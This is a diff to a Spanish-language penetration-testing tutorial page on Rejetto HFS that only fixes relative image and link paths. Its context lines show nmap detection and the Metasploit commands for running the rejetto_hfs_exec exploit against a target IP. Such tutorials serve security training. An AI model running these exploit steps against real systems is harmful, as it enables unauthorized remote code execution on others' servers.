@@ -8,7 +8,7 @@ Rejetto HFS es un servidor de archivos HTTP popular, gratuito y de código abier
 
 Podemos detectarlo con un escaneno de nmap.
 
-![hfs_nmap](../../../img/hfs_nmap.png)
+![hfs_nmap](../../img/hfs_nmap.png)
 
 ### Explotación con `rejetto_hfs_exec`
 
@@ -20,4 +20,5 @@ msf > use exploit/windows/http/rejetto_hfs_exec
 msf exploit(windows/http/rejetto_hfs_exec) > set rhosts <IP>
 msf exploit(windows/http/rejetto_hfs_exec) > run
 ```
-[⟵ Anterior](../../05_sistema.md#explotación-windows)
+
+[⟵ Anterior](../05_sistema.md#explotación-windows)
